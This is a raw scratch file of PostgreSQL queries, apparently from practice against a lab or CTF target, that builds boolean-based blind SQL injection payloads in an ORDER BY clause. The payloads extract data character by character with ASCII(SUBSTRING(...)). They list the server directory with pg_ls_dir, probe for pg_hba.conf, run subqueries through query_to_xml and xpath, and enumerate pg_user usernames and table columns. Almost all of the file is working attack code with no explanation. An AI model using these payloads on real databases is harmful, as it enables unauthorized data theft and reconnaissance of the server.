-- SELECT tablename 
-- from pg_tables
-- order by 
--     CASE WHEN (SELECT ASCII(SUBSTRING((select string_agg(pg_ls_dir, ',') from pg_ls_dir('.')), 1, 1)) 
-- FROM pg_tables where tablename='pg_type')=63 THEN tablename ELSE schemaname END

SELECT tablename 
from pg_tables
order by 
    CASE WHEN (SELECT ASCII(SUBSTRING(( with tab as (select * from pg_ls_dir('.')) select string_agg(pg_ls_dir,',') from tab), 1, 1)) 
FROM pg_tables where tablename='pg_type')=63 THEN tablename ELSE schemaname END

--

SELECT tablename 
from pg_tables
order by 
    CASE WHEN (SELECT ASCII(SUBSTRING((with tab as (select * from pg_ls_dir('.')) select string_agg(pg_ls_dir,',') from tab), 1, 1)) 
FROM pg_tables where tablename='pg_type')=112 THEN tablename ELSE schemaname END;

--  with tab as (select pg_ls_dir('.')) select pg_ls_dir from tab where pg_ls_dir like 'pg_hba.conf';


# Start db
/etc/init.d/postgresql start 

select xpath('row', query_to_xml('select tablename from pg_tables LIMIT 1 OFFSET 0', true, false, ''))

--


SELECT tablename 
from pg_tables 
order by 
CASE WHEN (
SELECT ASCII(
SUBSTRING(
(
xpath('row', 
query_to_xml('select tablename from pg_tables LIMIT 1 OFFSET 0', true, false, '')
)::varchar
), 1, 1)
) FROM pg_tables where tablename='pg_type'
)=112 THEN tablename ELSE schemaname END;


SELECT tablename 
from pg_tables 
order by 
CASE WHEN (
SELECT ASCII(
SUBSTRING(
(cast(
xpath('row', 
query_to_xml('select tablename from pg_tables LIMIT 1 OFFSET 0', true, false, '')
) as text)
), 1, 1)
) FROM pg_tables where tablename='pg_type'
)=112 THEN tablename ELSE schemaname END;

;

SELECT tablename 
from pg_tables 
order by 
CASE WHEN (
SELECT ASCII(
SUBSTRING(
(XMLSERIALIZE(DOCUMENT
query_to_xml('select tablename from pg_tables LIMIT 1 OFFSET 0', true, false, '')
 as text)
), 1, 1)
) FROM pg_tables where tablename='pg_type'
)=112 THEN tablename ELSE schemaname END;


SELECT tablename 
from pg_tables 
order by 
CASE WHEN (
SELECT ASCII(
SUBSTRING(
(XMLSERIALIZE(DOCUMENT
query_to_xml('select user', true, false, '')
 as text)
), 1, 1)
) FROM pg_tables where tablename='pg_type'
)=112 THEN tablename ELSE schemaname END;

SELECT tablename 
from pg_tables 
order by 
CASE WHEN (SELECT ASCII(SUBSTRING((XMLSERIALIZE(CONTENT query_to_xml('select user', true, false, '') as text)), 1, 1)) 
FROM  pg_tables where
tablename='pg_type')=63 THEN tablename ELSE schemaname END

--

SELECT tablename 
from pg_tables 
order by 
CASE WHEN (SELECT ASCII(SUBSTRING((XMLSERIALIZE(CONTENT '<a>b</a>' as text)), 1, 1)) 
FROM  pg_tables where
tablename='pg_type')=63 THEN tablename ELSE schemaname END;

--

SELECT tablename 
from pg_tables 
order by 
CASE WHEN (SELECT ASCII(SUBSTRING((cast(query_to_xml as text)), 1, 1)) 
FROM  query_to_xml('select user', true, false, ''))=63 THEN tablename ELSE schemaname END;


;

-- SELECT * 
-- from Criminal 
-- order by 
-- CASE WHEN (
--             SELECT ASCII(pg_catalog.SUBSTRING(
--                 (
--                   (concat(query_to_xml('select user', true, false, ''), 'blabla'))
--                 )
--             , 1, 1)) 
--             FROM   Criminal 
--             WHERE id=1
--             )=63 THEN crime ELSE name END;

SELECT * 
from Criminal 
order by 
CASE WHEN (
SELECT ASCII(pg_catalog.SUBSTRING(
    (
       (concat(query_to_xml('select user', true, false, ''), 'blabla'))
    )
, 1, 1)) 
FROM   Criminal 
WHERE id=1
)=63 THEN crime ELSE name END;


select array_upper(
    xpath('row',
    query_to_xml('select 1 where 1337<1', true, false,'')),1);
    
    
SELECT * 
from Criminal 
order by 
CASE WHEN (
    SELECT array_upper(
            xpath('row', 
                query_to_xml('select 1 where 0<1', true, false,'')
                ),
            1)
    )=1 THEN crime ELSE name END;
    
    
SELECT array_upper(xpath('row',
query_to_xml('select 1 where 0<1', true, false,'')),1);


SELECT xpath('row',
query_to_xml('select 1 where 0<1', true, false,''));


SELECT * 
from Criminal 
order by 
CASE WHEN (
SELECT  array_upper(
    xpath('row',
    query_to_xml('select 1 where 1337<1', true, false,'')),1)
)=1 THEN crime ELSE name END

--

SELECT array_upper(xpath('row',
query_to_xml('select 1 where 0<1', true, false,'')),1);


SELECT array_length(xpath('row',
query_to_xml('select 1 where 0<1', true, false,'')),5);


SELECT * 
from Criminal 
order by 
CASE WHEN (SELECT array_length(ARRAY[1,2],1) FROM Criminal WHERE id=1)=1 THEN crime ELSE name END


SELECT * 
from Criminal 
order by 
    CASE WHEN (
    SELECT  cardinality(
    xpath('row', 
    query_to_xml('select 1 where 1337<1', true, false,''))
    ) FROM Criminal where id=1
)=1 
THEN crime ELSE name END

--


SELECT * 
from Criminal 
order by 
    CASE WHEN (
    SELECT  cardinality(
    xpath('row', 
    query_to_xml('select 1 where 1337<1', true, false,''))
    ) FROM Criminal where id=1
)=1 
THEN crime ELSE name END

SELECT xpath('row', query_to_xml('select 1 where 0<1', true, false,''))
select xpath('count(row)', query_to_xml('select 1 where 1337<1', true, false,''))

select array_length(xpath('row', query_to_xml('select 1 where 1337>1', true, false,'')), 1)


select coalesce(array_length(xpath('row', query_to_xml('select 1 where 1337>1', true, false,'')), 1),0);


SELECT * 
from Criminal 
order by 
    CASE WHEN (
    select 1 
    FROM Criminal 
    where id=1 
    and array_upper(xpath('row',query_to_xml('select count(*)>10 from pg_users where',true,false,'')),1)=1 
)=1 
THEN crime ELSE name END


SELECT * 
from Criminal 
order by 
    CASE WHEN (
    select 1 
    FROM Criminal 
    where id=1 
    and array_upper(xpath('row',query_to_xml('select count(*) from pg_user',true,false,'')),1)=1 
)=1 
THEN crime ELSE name END



SELECT * 
from Criminal 
order by 
    CASE WHEN (
    select 1 
    FROM Criminal 
    where id=1 
    and array_upper(xpath('row',query_to_xml('select count(*) from pg_user',true,false,'')),1)=1 
)=1 
THEN crime ELSE name END


select substring(cast(array_agg(usename) as text),1,1) from pg_user;

 select column_name from information_schema.columns where
table_name='Criminal';